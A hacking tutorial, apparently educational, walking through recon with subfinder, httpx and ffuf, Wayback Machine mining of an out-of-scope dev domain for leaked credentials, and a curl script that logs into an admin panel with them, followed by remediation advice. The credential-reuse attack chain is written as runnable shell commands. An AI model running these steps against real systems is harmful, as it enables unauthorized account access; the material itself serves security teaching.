# Comprehensive Guide: Admin Panel Access via Archived Credentials from Out-of-Scope Domain

**🔴🔴🔴 WARNING: ETHICAL USE AND LEGAL COMPLIANCE REQUIRED 🔴🔴🔴**

This document provides a detailed walkthrough for educational purposes, simulating a scenario where reconnaissance on out-of-scope domains (via tools like the Wayback Machine) reveals archived credentials or sensitive information. These discovered artifacts are then used to gain unauthorized access to a protected resource on an in-scope target, highlighting risks from information leakage and credential reuse.

**YOU MUST ONLY APPLY THESE TECHNIQUES TO:**
1.  **Systems you OWN and have built for testing.**
2.  **Intentionally vulnerable applications in a controlled lab environment.**
3.  **Targets for which you have EXPLICIT, WRITTEN PERMISSION from the owner (e.g., official bug bounty programs, within defined scope).**

**UNAUTHORIZED ACCESS OR TESTING IS ILLEGAL AND UNETHICAL. YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

---

## Table of Contents
1.  [Objective & Scenario Overview](#1-objective--scenario-overview)
2.  [Prerequisites & Lab Setup (Conceptual)](#2-prerequisites--lab-setup-conceptual)
3.  [Phase 1: Reconnaissance (In-Scope Target)](#3-phase-1-reconnaissance-in-scope-target)
    *   [3.1. Subdomain Enumeration](#31-subdomain-enumeration)
    *   [3.2. Resolving Live Subdomains](#32-resolving-live-subdomains)
    *   [3.3. Directory & Path Fuzzing (Finding Protected Path)](#33-directory--path-fuzzing-finding-protected-path)
4.  [Phase 2: OSINT & Information Gathering (Pivoting to Out-of-Scope)](#4-phase-2-osint--information-gathering-pivoting-to-out-of-scope)
    *   [4.1. Initial OSINT on In-Scope Protected Path (Simulated Failure)](#41-initial-osint-on-in-scope-protected-path-simulated-failure)
    *   [4.2. Identifying Related Out-of-Scope Domains/Assets](#42-identifying-related-out-of-scope-domainsassets)
    *   [4.3. Wayback Machine Analysis on Out-of-Scope Assets](#43-wayback-machine-analysis-on-out-of-scope-assets)
    *   [4.4. Discovering Credentials/Endpoints in Archived Content](#44-discovering-credentialsendpoints-in-archived-content)
5.  [Phase 3: Exploitation - Using Discovered Credentials](#5-phase-3-exploitation---using-discovered-credentials)
    *   [5.1. Attempting Archived Credentials on In-Scope Protected Path](#51-attempting-archived-credentials-on-in-scope-protected-path)
6.  [Phase 4: Verification & Post-Exploitation (Ethical)](#6-phase-4-verification--post-exploitation-ethical)
    *   [6.1. Confirming Access](#61-confirming-access)
    *   [6.2. Documentation & Reporting](#62-documentation--reporting)
7.  [Remediation & Prevention Strategies](#7-remediation--prevention-strategies)
8.  [Conclusion](#8-conclusion)

---

## 1. Objective & Scenario Overview

*   **Objective:** To simulate and understand how information leakage from potentially misconfigured or older, out-of-scope systems (discoverable via OSINT tools like the Wayback Machine) can lead to the compromise of an in-scope, protected resource.
*   **Scenario Simulated:**
    1.  Standard reconnaissance on an in-scope target identifies a login-protected path.
    2.  Direct OSINT on this in-scope path for credentials fails.
    3.  The focus shifts to related but "out-of-scope" domains/assets (e.g., old dev/staging sites, other company products).
    4.  Wayback Machine analysis on an out-of-scope asset reveals archived pages containing leaked usernames, passwords, or sensitive API endpoints.
    5.  These leaked credentials/endpoints are then tested against the in-scope protected path, leading to successful authentication and access.
*   **Ethical Context:** This process is strictly for **authorized lab environments**. "Out-of-scope" here means assets you might define as such in your lab, or assets belonging to the same *fictional entity* in your lab. **Never probe actual out-of-scope assets of real companies.**

---

## 2. Prerequisites & Lab Setup (Conceptual)

To simulate this in a lab:

*   **In-Scope Target Application (Lab):**
    *   A web application (e.g., custom Flask/Django app, or a simple Apache/Nginx setup).
    *   It must have a specific path (e.g., `/secure_portal`, `/admin_console`) protected by HTTP Basic Authentication or a login form.
    *   The credentials for this path should be, for the sake of the scenario, identical to (or related to) credentials that will be "found" on the out-of-scope asset.
*   **Out-of-Scope Asset (Simulated Lab):**
    *   Another web application or a set of static files, also hosted in your lab, representing an older, less secure version or a related dev system (e.g., `dev-legacy.your-lab-domain.com`).
    *   **Crucially:** You need to create a file on this "out-of-scope" asset that contains plain text credentials or sensitive information (e.g., `dev-legacy.your-lab-domain.com/old_config/debug_info.txt` containing `admin_user:OldPassword123`).
    *   **Wayback Simulation:** Since the actual Wayback Machine won't crawl your local lab, you will *simulate* finding this `debug_info.txt` through "Wayback" by knowing its location in your lab setup. For realism, you can ensure this file is *not* linked from the main page of `dev-legacy` but would have been if it were an old, forgotten file.
*   **Tools Environment:**
    *   Web Browser with Developer Tools & a Wayback Machine browser extension (or use the Wayback Machine website for searching, understanding its limitations for non-public sites).
    *   `curl`
    *   Subdomain enumeration tools (`subfinder`, `amass`, etc. - for the in-scope target)
    *   Directory/path fuzzer (`ffuf`, `gobuster` - for the in-scope target)
    *   `httpx`
    *   `waybackurls` (by tomnomnom - `go install github.com/tomnomnom/waybackurls@latest`) for scripting Wayback queries.
*   **Placeholders:**
    ```bash
    # In your notes or shell script for convenience
    export IN_SCOPE_TARGET_DOMAIN="your-in-scope-lab.com" # !!! REPLACE e.g., mysecureapp.local !!!
    export IN_SCOPE_TARGET_BASE_URL="http://${IN_SCOPE_TARGET_DOMAIN}" # Assuming HTTP for simplicity in lab
    
    # For simulation, you pre-define this "out-of-scope" asset in your lab
    export SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN="dev-legacy.your-lab-domain.com" # !!! REPLACE e.g., dev.mysecureapp.local !!!
    export SIMULATED_OUT_OF_SCOPE_BASE_URL="http://${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}"
    export SIMULATED_ARCHIVED_PATH_WITH_CREDS="/old_config/debug_info.txt" # The path you'll "find"
    ```

---

## 3. Phase 1: Reconnaissance (In-Scope Target)

Focus on the primary, authorized target.

### 3.1. Subdomain Enumeration
*   **Action:** Enumerate subdomains for `{$IN_SCOPE_TARGET_DOMAIN}`.
*   **Code (Shell - Conceptual):**
    ```bash
    # Ensure IN_SCOPE_TARGET_DOMAIN is set
    echo "[INFO] Subdomain enumeration for ${IN_SCOPE_TARGET_DOMAIN}..."
    # subfinder -d "${IN_SCOPE_TARGET_DOMAIN}" -o "subfinder_${IN_SCOPE_TARGET_DOMAIN}.txt" -silent
    # amass enum -passive -d "${IN_SCOPE_TARGET_DOMAIN}" -o "amass_${IN_SCOPE_TARGET_DOMAIN}.txt"
    # cat "subfinder_${IN_SCOPE_TARGET_DOMAIN}.txt" "amass_${IN_SCOPE_TARGET_DOMAIN}.txt" | sort -u > "all_subdomains_in_scope_${IN_SCOPE_TARGET_DOMAIN}.txt"
    # For a lab, you might just have one or two predefined subdomains.
    echo "${IN_SCOPE_TARGET_DOMAIN}" > "all_subdomains_in_scope_${IN_SCOPE_TARGET_DOMAIN}.txt" # Example if base domain is target
    echo "www.${IN_SCOPE_TARGET_DOMAIN}" >> "all_subdomains_in_scope_${IN_SCOPE_TARGET_DOMAIN}.txt" # Example
    echo "[INFO] In-scope subdomains list: all_subdomains_in_scope_${IN_SCOPE_TARGET_DOMAIN}.txt"
    ```

### 3.2. Resolving Live Subdomains
*   **Action:** Check which enumerated subdomains are live.
*   **Code (Shell - using `httpx`):**
    ```bash
    # Ensure IN_SCOPE_TARGET_DOMAIN is set
    SUBDOMAIN_LIST_IN_SCOPE="all_subdomains_in_scope_${IN_SCOPE_TARGET_DOMAIN}.txt"
    if [ ! -f "${SUBDOMAIN_LIST_IN_SCOPE}" ]; then echo "[ERROR] In-scope subdomain list not found."; exit 1; fi
    if ! command -v httpx &> /dev/null; then echo "[WARN] httpx not found."; exit 1; fi

    echo "[INFO] Probing live in-scope subdomains from ${SUBDOMAIN_LIST_IN_SCOPE}..."
    cat "${SUBDOMAIN_LIST_IN_SCOPE}" | httpx -silent -threads 20 -title -o "live_in_scope_subdomains_${IN_SCOPE_TARGET_DOMAIN}.txt"
    echo "[SUCCESS] Live in-scope subdomains saved to live_in_scope_subdomains_${IN_SCOPE_TARGET_DOMAIN}.txt:"
    cat "live_in_scope_subdomains_${IN_SCOPE_TARGET_DOMAIN}.txt"
    # For this scenario, we'll focus on IN_SCOPE_TARGET_BASE_URL
    ```

### 3.3. Directory & Path Fuzzing (Finding Protected Path)
*   **Action:** Fuzz the live in-scope target(s) to find directories, especially protected ones.
*   **Code (Shell - using `ffuf`):**
    ```bash
    # Ensure IN_SCOPE_TARGET_BASE_URL and WORDLIST_PATH are set
    # WORDLIST_PATH="${HOME}/SecLists/Discovery/Web-Content/common.txt" # Example
    if [ -z "${IN_SCOPE_TARGET_BASE_URL}" ] || [ -z "${WORDLIST_PATH}" ]; then echo "[ERROR] Required vars not set."; exit 1; fi
    if [ ! -f "${WORDLIST_PATH}" ]; then echo "[ERROR] Wordlist ${WORDLIST_PATH} not found."; exit 1; fi
    if ! command -v ffuf &> /dev/null; then echo "[WARN] ffuf not found."; exit 1; fi

    echo "[INFO] Fuzzing paths on ${IN_SCOPE_TARGET_BASE_URL}..."
    ffuf -w "${WORDLIST_PATH}" -u "${IN_SCOPE_TARGET_BASE_URL}/FUZZ" \
         -mc 200,301,302,401,403 -fc 404 -t 50 -c
    ```
*   **Scenario Outcome:** "finally arrived at a specific path. When I opened the desired path, a message was displayed requiring a username and password to access this path."
    *   This means `ffuf` likely found a path returning `401 Unauthorized` (for HTTP Basic Auth) or `200 OK` but displaying a login form.
    *   **Action: Note this protected path.**
        ```bash
        export IN_SCOPE_PROTECTED_PATH="/secure_portal" # !!! REPLACE with path found by ffuf !!!
        export IN_SCOPE_PROTECTED_URL="${IN_SCOPE_TARGET_BASE_URL}${IN_SCOPE_PROTECTED_PATH}"
        echo "[CONFIRMED] In-scope protected URL: ${IN_SCOPE_PROTECTED_URL}"
        # Verify in browser: it should prompt for credentials or show a login page.
        ```

---

## 4. Phase 2: OSINT & Information Gathering (Pivoting to Out-of-Scope)

### 4.1. Initial OSINT on In-Scope Protected Path (Simulated Failure)

The scenario states that initial OSINT on the *in-scope* path was unsuccessful.

*   **Action (Simulated):**
    *   Google Dorking: `site:{IN_SCOPE_TARGET_DOMAIN} inurl:{IN_SCOPE_PROTECTED_PATH} intitle:"login" password` (yields nothing)
    *   Wayback Machine for `{$IN_SCOPE_PROTECTED_URL}`:
        ```bash
        # waybackurls "${IN_SCOPE_PROTECTED_URL}"
        # (yields no useful archived credentials for this path)
        ```
    *   GitHub Search: Search for `"{IN_SCOPE_TARGET_DOMAIN}" "{IN_SCOPE_PROTECTED_PATH}" password` (yields nothing relevant)
*   **Outcome:** "I started searching Google and the Wayback Machine and GitHub and all the indexes, but I couldn’t find anything that pointed directly to this particular path."

### 4.2. Identifying Related Out-of-Scope Domains/Assets

This requires investigative work or sometimes prior knowledge. For a lab, you define these.
Methods to find related (potentially out-of-scope) assets in real scenarios:
*   Company's other products/websites.
*   ASN/IP range analysis (tools like `asnmap`).
*   Reverse IP lookups.
*   SSL Certificate's Subject Alternative Names (SANs).
*   Acquisition history of the company.
*   Developer profiles on GitHub/LinkedIn mentioning past projects.
*   **For this lab, we use our predefined `SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN`.**

### 4.3. Wayback Machine Analysis on Out-of-Scope Assets

Now, apply OSINT tools to the identified (simulated) out-of-scope assets.

*   **Action:** Use `waybackurls` (or a browser extension) on the `{$SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}`.
*   **Code (Shell - using `waybackurls`):**
    ```bash
    # Ensure SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN is set
    if [ -z "${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}" ]; then echo "[ERROR] SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN not set."; exit 1; fi
    if ! command -v waybackurls &> /dev/null; then echo "[WARN] waybackurls not found."; exit 1; fi

    echo "[INFO] Fetching Wayback Machine URLs for out-of-scope domain: ${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}"
    waybackurls "${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}" > "wayback_out_of_scope_${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}.txt"
    
    if [ -s "wayback_out_of_scope_${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}.txt" ]; then
        echo "[SUCCESS] Wayback URLs saved to wayback_out_of_scope_${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}.txt. Now manually review these URLs."
        # Example: cat "wayback_out_of_scope_${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}.txt" | grep -iE '\.txt$|\.log$|config|backup|debug|admin|password'
        # In our lab, we "know" the specific path to look for or simulate finding.
    else
        echo "[INFO] No Wayback URLs found for ${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN} (or tool error)."
    fi
    ```
*   **Scenario Outcome:** "for one of them, my Wayback Machine Extension was activated and some archived paths were detected." This means specific URLs from the past were found.

### 4.4. Discovering Credentials/Endpoints in Archived Content

Manually review the interesting archived URLs found by Wayback Machine for the out-of-scope asset.

*   **Action:**
    1.  Iterate through the URLs in `wayback_out_of_scope_${SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}.txt`.
    2.  Open them in your browser (using the Wayback Machine's archived version link, e.g., `web.archive.org/web/*/URL`).
    3.  Look for plain text credentials, API keys, sensitive configuration files (`.env`, `.config`, `settings.ini`), debug output, old API documentation, etc.
    4.  **In our Lab Simulation:** We will directly "discover" the credentials from the path we predefined.
*   **Code (Simulating fetching the known archived file content):**
    ```bash
    # Ensure SIMULATED_OUT_OF_SCOPE_BASE_URL and SIMULATED_ARCHIVED_PATH_WITH_CREDS are set
    ARCHIVED_FILE_URL="${SIMULATED_OUT_OF_SCOPE_BASE_URL}${SIMULATED_ARCHIVED_PATH_WITH_CREDS}"

    echo "[INFO] Simulating fetching content from known 'archived' sensitive file: ${ARCHIVED_FILE_URL}"
    # In a real scenario, you'd be viewing this via web.archive.org
    # For the lab, we assume the file on our simulated dev server contains:
    # Username: dev_admin_legacy
    # Password: ArchivedPassword123!
    # Endpoint_Hint: /api/v1/debug_access
    
    # Simulate its content for the script
    cat << EOF > "simulated_archived_content.txt"
    # Old Dev Server Debug Info - DO NOT USE IN PROD
    # Last updated: 2019-01-15
    Username: dev_admin_legacy
    Password: ArchivedPassword123!
    Internal_API_Endpoint: /api/v1/debug_access
    Token: temp_dev_token_expired
EOF
    echo "[SIMULATED FINDING] Content of archived file (simulated_archived_content.txt):"
    cat "simulated_archived_content.txt"
    ```
*   **Scenario Outcome:** "I opened the archived paths and found a few usernames, passwords, and specific endpoints."
*   **Action: Extract the discovered credentials.**
    ```bash
    export LEAKED_USERNAME="dev_admin_legacy"       # !!! REPLACE from simulated_archived_content.txt or actual finding !!!
    export LEAKED_PASSWORD="ArchivedPassword123!"   # !!! REPLACE from simulated_archived_content.txt or actual finding !!!
    echo "[CREDENTIALS DISCOVERED] Username: ${LEAKED_USERNAME}, Password: [REDACTED]"
    ```

---

## 5. Phase 3: Exploitation - Using Discovered Credentials

Now, try the credentials found on the out-of-scope asset against the protected path on the **in-scope** target.

### 5.1. Attempting Archived Credentials on In-Scope Protected Path

*   **Action:** Use the `LEAKED_USERNAME` and `LEAKED_PASSWORD` to try and access the `{$IN_SCOPE_PROTECTED_URL}`. This can be done via browser or `curl`.
*   **Code (Shell - using `curl` with HTTP Basic Authentication):**
    ```bash
    # Ensure IN_SCOPE_PROTECTED_URL, LEAKED_USERNAME, LEAKED_PASSWORD are set
    if [ -z "${IN_SCOPE_PROTECTED_URL}" ] || [ -z "${LEAKED_USERNAME}" ] || [ -z "${LEAKED_PASSWORD}" ]; then
        echo "[ERROR] Required variables for exploitation are not set."
        exit 1
    fi

    echo "[EXPLOIT ATTEMPT] Trying credentials on in-scope URL: ${IN_SCOPE_PROTECTED_URL}"
    echo "  Username: ${LEAKED_USERNAME}"
    echo "  Password: [REDACTED]"

    # -u username:password for Basic Auth
    # -v for verbose output (to see request and response headers)
    # -s for silent (less output, but -v overrides some of it)
    # -L to follow redirects
    # -k if your lab uses self-signed SSL for HTTPS (remove for valid certs)
    # Add --head for quicker check if you only care about status code initially
    curl -s -L -k -u "${LEAKED_USERNAME}:${LEAKED_PASSWORD}" "${IN_SCOPE_PROTECTED_URL}" -v -o "exploit_attempt_output.html"

    # Check response code from verbose output or by re-running with -w "%{http_code}"
    http_status_after_auth=$(curl -s -L -k -o /dev/null -w "%{http_code}" -u "${LEAKED_USERNAME}:${LEAKED_PASSWORD}" "${IN_SCOPE_PROTECTED_URL}")
    
    echo "[EXPLOIT RESPONSE] HTTP Status after auth attempt: ${http_status_after_auth}"
    if [ "${http_status_after_auth}" = "200" ]; then
        echo -e "\033[0;32m[SUCCESS!] Authentication successful (200 OK). Admin panel access likely gained.\033[0m"
        echo "         Content saved to exploit_attempt_output.html. Review it."
    elif [ "${http_status_after_auth}" = "401" ] || [ "${http_status_after_auth}" = "403" ]; then
        echo -e "\033[0;31m[FAILURE] Authentication failed (Status: ${http_status_after_auth}). Credentials incorrect or access still denied.\033[0m"
    else
        echo "[INFO] Unexpected HTTP status: ${http_status_after_auth}. Review exploit_attempt_output.html."
    fi
    ```
*   **Scenario Outcome:** "I replaced them in the subdomain in scope and one of them worked correctly and I got access to the admin panel. Now I’m In." This implies the `curl` (or browser attempt) resulted in a `200 OK` and access to the admin panel content.

---

## 6. Phase 4: Verification & Post-Exploitation (Ethical)

### 6.1. Confirming Access
*   **Action:** If `curl` showed a `200 OK`, open `exploit_attempt_output.html` or navigate to `{$IN_SCOPE_PROTECTED_URL}` in your browser and provide the `LEAKED_USERNAME` and `LEAKED_PASSWORD`. Confirm that you can access the admin panel functionality.
*   **In a Lab:** Explore the admin panel to understand the extent of access. **Do not make destructive changes.**

### 6.2. Documentation & Reporting
If this were an authorized test:
*   **Detailed Report:**
    *   Vulnerability: "Admin Panel Access via Leaked Credentials from Archived Out-of-Scope Asset."
    *   In-scope protected path: `{$IN_SCOPE_PROTECTED_URL}`.
    *   Out-of-scope asset where creds were found: `{$SIMULATED_OUT_OF_SCOPE_DEV_DOMAIN}`.
    *   Specific archived path of the leak: `{$SIMULATED_ARCHIVED_PATH_WITH_CREDS}` (or link to Wayback Machine).
    *   The leaked credentials (or a masked version if reporting externally).
    *   Proof of successful login to the in-scope panel.
    *   Impact: Unauthorized administrative access.

---

## 7. Remediation & Prevention Strategies

*   **Credential Management & Hygiene:**
    *   **No Credential Reuse:** Do not use the same or similar passwords across different environments (dev, staging, prod) or different applications.
    *   **Strong, Unique Passwords:** Enforce for all accounts.
    *   **Regular Rotation:** Rotate credentials, especially for sensitive accounts and after staff changes.
    *   **Secrets Management:** Use a proper secrets management solution instead of hardcoding or leaving credentials in files.
*   **Securing Non-Production Environments:**
    *   Dev, staging, and UAT environments should be treated with a high degree of security if they process or store sensitive data, or if their compromise could lead to production compromise.
    *   **Authentication:** Protect these environments with strong authentication (e.g., SSO, MFA, IP whitelisting).
    *   **No Public Indexing:** Use `robots.txt` (`User-agent: * Disallow: /`) and HTTP headers (`X-Robots-Tag: noindex, nofollow`) to prevent search engines and archivers like Wayback Machine from indexing non-production sites.
    *   **Network Segmentation:** Isolate non-production environments from the public internet where possible.
*   **Data Sanitization & Decommissioning:**
    *   When decommissioning old systems or files, ensure all sensitive data, including credentials and configuration, is securely wiped or removed.
    *   Do not leave old, forgotten files containing sensitive information on web servers.
*   **Information Leakage Monitoring:**
    *   Regularly search public code repositories (GitHub, GitLab), paste sites, and archives (like Wayback Machine) for accidental leaks of your organization's sensitive information.
*   **Principle of Least Privilege:** Ensure accounts only have the permissions necessary for their role.
*   **Regular Security Audits & Penetration Testing:** Include checks for information leakage from related or legacy systems.

---

## 8. Conclusion

This educational simulation demonstrates how seemingly disconnected information leakage, even from "out-of-scope" or legacy systems, can pose a direct threat to current, in-scope applications due to factors like credential reuse or shared configurations. It emphasizes the importance of a holistic security posture that considers the entire lifecycle of applications and infrastructure, including proper decommissioning and data sanitization.

**Always practice ethical hacking responsibly and within legal boundaries. Understanding attack vectors like this helps build more resilient defenses.**

---
**Follow @muneebwanee for more Hacking Tutorials**
